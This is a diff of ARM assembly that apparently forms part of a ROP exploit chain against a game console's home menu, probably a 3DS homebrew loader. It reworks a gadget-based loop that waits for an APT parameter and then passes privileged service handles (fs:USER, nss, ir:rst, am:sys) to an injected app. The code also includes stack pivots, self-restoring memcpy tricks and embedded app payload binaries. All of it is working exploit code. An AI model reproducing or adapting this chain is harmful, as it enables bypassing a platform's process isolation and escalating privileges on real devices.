@@ -361,32 +361,13 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	.word ROP_MENU_APT_LEAVEHOMEMENU
 .endmacro
 
-.macro wait_for_parameter,app_id
-	@@loop_start:
-	sleep 100*1000, 0x00000000
-	apt_open_session 1
-	apt_glance_parameter app_id, DUMMY_PTR, 0x0, DUMMY_PTR, DUMMY_PTR, 1
-	; compare to 0x0 value
-	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
-		.word 0x00000000
-	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
-		.word 0xDEADBABE ; r4 (garbage)
-	; overwrite stack pivot with NOP if not equal
-	.word ROP_MENU_POP_R4PC
-		.word MENU_NOP
-	.word ROP_MENU_POP_R0PC
-		.word MENU_OBJECT_LOC + @@loop_pivot - 0x4
-	.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
-		.word 0xDEADBABE ; r4 (garbage)
-	apt_close_session 1 ; can't close earlier because need to maintain r0 and flags
-	.word ROP_MENU_POP_R4PC
-		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
-	@@loop_pivot:
-	.word ROP_MENU_STACK_PIVOT
-	.word ROP_MENU_POP_R4R5PC
-	@@pivot_data:
-		.word MENU_OBJECT_LOC + @@loop_start ; sp
-		.word MENU_NOP ; pc
+.macro wait_for_parameter_and_send,buffer_ptr, handle_ptr
+	store MENU_LOADEDROP_BUFADR + @@ret_sp, MENU_LOADEDROP_BUFADR + waitForParameter_loop_retsp
+	store MENU_STACK_PIVOT, MENU_LOADEDROP_BUFADR + waitForParameter_loop_pivot
+	store handle_ptr, MENU_LOADEDROP_BUFADR + waitForParameter_loop_handle_ptr
+	store buffer_ptr, MENU_LOADEDROP_BUFADR + waitForParameter_loop_buffer_ptr
+	jump_sp MENU_LOADEDROP_BUFADR + waitForParameter_loop_memcpy
+	@@ret_sp:
 .endmacro
 
 .macro jump_sp,dst
@@ -937,11 +918,6 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 
 		APT_TitleLaunch_end:
 
-		; send app parameter
-			apt_open_session 0, 0
-			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + fsUserString, 0x8, MENU_FS_HANDLE
-			apt_close_session 0, 0
-
 		; invalidate dcache for app_code before we write to it
 			invalidate_dcache MENU_OBJECT_LOC + appCode, 0x4000
 
@@ -969,26 +945,10 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		; release gsp rights
 			gsp_release_right
 
-			; wait_for_parameter 0x101
-			sleep 300*1000*1000, 0x00000000
-
-			apt_open_session 0, 0
-			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + nssString, 0x8, MENU_NSS_HANDLE
-			apt_close_session 0, 0
-
-			; wait_for_parameter 0x101
-			sleep 100*1000*1000, 0x00000000
-
-			apt_open_session 0, 0
-			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + irrstString, 0x8, MENU_IRRST_HANDLE
-			apt_close_session 0, 0
-
-			; wait_for_parameter 0x101
-			sleep 100*1000*1000, 0x00000000
-
-			apt_open_session 0, 0
-			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR + amsysString, 0x8, MENU_AMSYS_HANDLE
-			apt_close_session 0, 0
+			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + fsUserString, MENU_FS_HANDLE
+			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + nssString, MENU_NSS_HANDLE
+			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + irrstString, MENU_IRRST_HANDLE
+			wait_for_parameter_and_send MENU_LOADEDROP_BUFADR + amsysString, MENU_AMSYS_HANDLE
 
 		; memcpy wait loop to destination
 			memcpy WAITLOOP_DST, (MENU_OBJECT_LOC+waitLoop_start-object), (waitLoop_end-waitLoop_start), 0, 0
@@ -1051,6 +1011,68 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.ascii "am:sys"
 		.byte 0x00
 		.byte 0x00
+
+	.align 0x4
+	waitForParameter_loop:
+		sleep 100*1000, 0x00000000
+		apt_open_session 0, 0
+		apt_glance_parameter 0x101, DUMMY_PTR, 0x0, DUMMY_PTR, DUMMY_PTR, 0, 0
+		; compare to 0x0 value
+		.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+			.word 0x00000000
+		.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
+			.word 0xDEADBABE ; r4 (garbage)
+		.word ROP_MENU_POP_R4PC
+			.word ROP_MENU_POP_R4R5PC ; r4
+		.word ROP_MENU_POP_R0PC
+			.word MENU_OBJECT_LOC + waitForParameter_loop_pivot - 4
+		.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
+			.word 0xDEADBABE ; r4 (garbage)
+		apt_close_session 0, 0 ; can't close earlier because need to maintain r0 and flags
+		waitForParameter_loop_memcpy:
+		memcpy (MENU_LOADEDROP_BUFADR + waitForParameter_loop), (MENU_LOADEDROP_BKP_BUFADR + waitForParameter_loop), (waitForParameter_loop_memcpy-waitForParameter_loop), 1, 0
+		.word ROP_MENU_POP_R4PC
+			.word MENU_OBJECT_LOC + waitForParameter_loop_data + 4 ; r4 (pivot data location)
+		waitForParameter_loop_pivot:
+		.word ROP_MENU_STACK_PIVOT
+			waitForParameter_loop_data:
+			.word MENU_OBJECT_LOC + waitForParameter_loop ; sp
+			.word MENU_NOP ; pc
+		apt_open_session 0, 0
+		.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+			waitForParameter_loop_handle_ptr:
+			.word 0xDEADBABE ; r0
+		.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
+			.word MENU_LOADEDROP_BUFADR + waitForParameter_loop_handle_loc ; r4 (destination address)
+		.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
+			.word 0xDEADBABE ; r4 (garbage)
+		set_lr ROP_MENU_POP_R4R5PC
+		.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+			.word 0x101 ; r0 (source app_id)
+		.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+			.word 0x101 ; r1 (destination app_id)
+		.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+			.word 0x00000001 ; r2 (signal type)
+			waitForParameter_loop_buffer_ptr:
+			.word 0xDEADBABE ; r3 (parameter buffer ptr)
+			.word 0xDEADBABE ; r4 (garbage)
+			.word 0xDEADBABE ; r5 (garbage)
+			.word 0xDEADBABE ; r6 (garbage)
+		.word ROP_MENU_APT_SENDPARAMETER
+			.word 0x8 ; arg_0 (parameter buffer size) (r4 (garbage))
+			waitForParameter_loop_handle_loc:
+			.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
+		apt_close_session 0, 0
+		waitForParameter_loop_memcpy2:
+		memcpy (MENU_LOADEDROP_BUFADR + waitForParameter_loop), (MENU_LOADEDROP_BKP_BUFADR + waitForParameter_loop), (waitForParameter_loop_memcpy2-waitForParameter_loop), 1, 0
+		.word ROP_MENU_POP_R4PC
+			.word MENU_OBJECT_LOC + waitForParameter_loop_data2 + 4 ; r4 (pivot data location)
+		.word ROP_MENU_STACK_PIVOT
+			waitForParameter_loop_data2:
+			waitForParameter_loop_retsp:
+			.word 0xDEAD0000 ; will be overwritten (sp)
+			.word MENU_NOP ; pc
+			.ascii "end"
 
 	.align 0x4
 	waitLoop_start:
@@ -1309,13 +1331,14 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			
 		.pool
 
-		.fill ((appHook + 0x200) - .), 0xDA
+		; don't actually care if we copy too much...
+		; .fill ((appHook + 0x200) - .), 0xDA
 
-	.align 0x100
+	.align 0x20
 	appCode:
 		.incbin "app_code.bin"
 
-	.align 0x100
+	.align 0x20
 	appBootloader:
 		.incbin "app_bootloader.bin"
 
